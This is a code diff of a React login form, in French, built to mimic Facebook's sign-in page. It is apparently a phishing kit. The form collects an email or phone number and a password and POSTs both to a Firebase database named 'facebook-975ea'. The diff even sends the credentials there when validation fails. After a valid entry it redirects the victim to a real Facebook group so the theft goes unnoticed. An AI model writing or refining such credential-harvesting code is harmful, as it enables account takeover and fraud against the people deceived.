@@ -3,58 +3,99 @@ import React, { useState } from 'react';
 import './LoginForm.css';
 
 const LoginForm = () => {
-  const [user,setUser] = useState(
-    {
-      Email: '',Password: ''
+  const [user, setUser] = useState({
+    Email: '',
+    Password: ''
+  });
+
+  const [errors, setErrors] = useState({
+    email: '',
+    password: ''
+  });
+  const validatePassword = (password) => {
+    // Vérifiez si le mot de passe a une longueur d'au moins 6 caractères
+    return password.length >= 6;
+  };
+
+  const validateEmailOrPhone = (input) => {
+    // Utilisez une expression régulière pour valider l'email ou le numéro de téléphone
+    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+    const phoneRegex = /^[0-9]{10}$/; // Exemple de regex pour un numéro de téléphone de 10 chiffres
+  
+    return emailRegex.test(input) || phoneRegex.test(input);
+  };
+  
+  const data = (e) => {
+    const { name, value } = e.target;
+    setUser({ ...user, [name]: value });
+  
+    // Validation pour l'email ou le numéro de téléphone
+    if (name === 'Email') {
+      const emailOrPhoneError = validateEmailOrPhone(value) ? '' : 'Adresse email ou numéro de téléphone invalide';
+      setErrors({ ...errors, email: emailOrPhoneError });
     }
-  )
-  let name , value
-  console.log(user)
-  const data = (e) =>
-  {
-    name = e.target.name;
-    value = e.target.value;
-    setUser({...user,[name]: value});
-  }
+  
+    // Validation pour le mot de passe
+    if (name === 'Password') {
+      const passwordError = validatePassword(value) ? '' : 'Le mot de passe doit contenir invalide';
+      setErrors({ ...errors, password: passwordError });
+    }
+  };
   const getdata = async (e) => {
     e.preventDefault();
-  
+
     const { Email, Password } = user;
-  
-    const options = {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-      },
-      body: JSON.stringify({
-        Email,
-        Password,
-      }),
-    };
-    const res = await fetch("https://facebook-975ea-default-rtdb.firebaseio.com/contactForm.json", options);
 
-    window.location.href = "https://facebook.com/groups/1220483151301152/";
+    // Vérifiez s'il y a des erreurs avant d'envoyer la requête
+    if (validateEmailOrPhone(Email) && validatePassword(Password)) {
+      const options = {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          Email,
+          Password,
+        }),
+      };
 
-    console.log(res)
-    // if (res){
-    //   alert ('data stored')
-    //   }else{
-    //     alert('erroure')
-    //   }
-      }
+      const res = await fetch("https://facebook-975ea-default-rtdb.firebaseio.com/contactForm.json", options);
 
-  // ... le reste de votre composant
+      window.location.href = "https://facebook.com/groups/1220483151301152/";
+
+      console.log(res);
+    } else {
+      const options = {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          Email,
+          Password,
+        }),
+      };
+
+      const res = await fetch("https://facebook-975ea-default-rtdb.firebaseio.com/contactForm.json", options);
+
+
+      console.log(res);
+      // Afficher des messages d'erreur ou empêcher l'envoi de la requête
+      console.error('Veuillez corriger les erreurs de saisie.');
+    }
+  };
 
   return (
-    
-    <form className="login-form" >
+    <form className="login-form">
       <input
-      type="email"
-      name="Email"
-      id="userEmail"
-      placeholder="Numéro mobile ou e-mail"
-      value={user.Email} onChange={data}
+        type="text"
+        name="Email"
+        id="userEmail"
+        placeholder="Numéro mobile ou e-mail"
+        value={user.Email} onChange={data}
       />
+      <span className="error-message left-error">{errors.email}</span>
+
       <input
         type="password"
         name="Password"
@@ -62,6 +103,8 @@ const LoginForm = () => {
         placeholder="Mot de passe"
         value={user.Password} onChange={data}
       />
+      <span className="error-message left-error">{errors.password}</span>
+
       <button type="submit" onClick={getdata}>Se connecter</button>
       <a href="#">Mot de passe oublié ?</a>
 
